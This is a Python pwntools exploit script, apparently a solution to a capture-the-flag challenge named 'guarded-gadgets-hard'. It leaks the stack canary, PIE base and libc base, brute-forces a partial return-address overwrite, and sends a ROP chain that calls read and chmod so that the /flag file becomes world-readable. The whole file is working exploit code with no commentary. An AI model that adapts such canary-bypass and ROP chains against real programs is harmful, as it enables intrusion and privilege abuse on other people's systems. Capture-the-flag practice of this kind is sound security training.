#!/usr/bin/python3

import time
from pwn import *
import re

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/guarded-gadgets-hard')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rbp = 0x7ffd559d6330
input_start = rbp - 0x20
ret = rbp + 0x8
canary_add = rbp - 8
canary_offset = canary_add - input_start

def get_canary(io):
    io.recvuntil(b"[LEAK]")
    data = io.recvline().decode()
    regex = r"0x[a-f\d]+"
    input_start_leak = int(re.findall(regex,data)[0],16)
    actual_canary_address = input_start_leak + canary_offset
    io.sendline(str(hex(actual_canary_address)).encode())
    io.recvuntil(b"[LEAK]")
    data = io.recvline().decode()
    canary_leak = int(re.findall(regex,data)[1],16)
    return io,canary_leak
    
def get_pie(io):
    io.recvuntil(b"[LEAK]").decode()
    data = io.recvline().decode()
    i = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    io.sendline(str(hex(i + canary_offset - 32)).encode())
    io.recvuntil(b"[LEAK]")
    data = io.recvline().decode()
    pie_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    pie_base = pie_leak - 8496
    return io,pie_base

def get_libc(io,canary):
    payload = b"a" * (canary_offset) + p64(canary) + b"b" * 8 + p64(elf.sym._start)
    io.send(payload)
    io.recvuntil(b"[LEAK]").decode()
    data = io.recvline().decode()
    i = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    io.sendline(str(hex(i + canary_offset + 16)).encode())
    io.recvuntil(b"[LEAK]")
    data = io.recvline().decode()
    libc_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    print(hex(libc_leak))
    libc_base = libc_leak - 0x24083
    return io,libc_base



counter = 0
while 1:
    print(counter)
    counter += 1
    io = process()
    io,canary = get_canary(io)
    payload = b"a" * (canary_offset) + p64(canary) + b"b" * 8 + libc.sym.__libc_start_main.to_bytes(3,"little")
    io.send(payload)
    io.wait(timeout=0.05)
    if io.poll() is None:
        io,pie = get_pie(io)
        elf.address = pie
        io,libc_base = get_libc(io,canary)
        libc.address = libc_base
        print(hex(pie),hex(libc_base))
        rop_elf = ROP(elf)
        rop_libc = ROP(libc)
        pop_rdi = rop_elf.find_gadget(["pop rdi","ret"]).address
        pop_rsi = rop_elf.find_gadget(["pop rsi","pop r15","ret"]).address
        pop_rdx = rop_libc.find_gadget(["pop rdx","pop r12","ret"]).address
        print(hex(pop_rdi),hex(pop_rsi),hex(pop_rdx))
        payload = b"a" * canary_offset + p64(canary) + b"a" * 8
        payload += p64(pop_rdi) + p64(0)
        payload += p64(pop_rsi) + p64(elf.bss()+0x200) + p64(0)
        payload += p64(pop_rdx) + p64(10) + p64(0)
        payload += p64(elf.sym.read)
        payload += p64(pop_rdi) + p64(elf.bss()+0x200)
        payload += p64(pop_rsi) + p64(511) + p64(0)
        payload += p64(libc.sym.chmod)
        io.send(payload)
        time.sleep(5)
        io.send(b"/flag\x00")
        print(io.recvall().decode())
        break
    io.close()
